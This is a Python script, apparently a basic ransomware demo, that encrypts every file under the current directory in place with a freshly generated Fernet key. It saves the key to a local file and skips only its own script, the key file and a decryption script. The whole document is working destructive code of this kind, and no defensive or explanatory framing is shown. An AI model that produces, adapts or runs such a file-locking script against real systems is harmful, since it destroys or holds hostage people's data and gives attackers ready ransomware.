import os
from cryptography.fernet import Fernet

def encrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file_path, "wb") as thefile:
            thefile.write(contents_encrypted)
    except (PermissionError, IsADirectoryError):
        print(f"Skipping {file_path} due to lack of permissions or it's a directory.")
    except Exception as e:
        print(f"Error processing file {file_path}: {e}")

def encrypt_directory(directory_path, key):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

if __name__ == "__main__":
    exclude_files = ["app.py", "thekey.key", "decryption.py"]
    
    files_and_directories = [f for f in os.listdir() if f not in exclude_files]

    print("Files and Directories Encrypted!!")

    key = Fernet.generate_key()

    with open("thekey.key", "wb") as thekey:
        thekey.write(key)

    for item in files_and_directories:
        item_path = os.path.join(os.getcwd(), item)
        if os.path.isfile(item_path):
            encrypt_file(item_path, key)
        elif os.path.isdir(item_path):
            encrypt_directory(item_path, key)
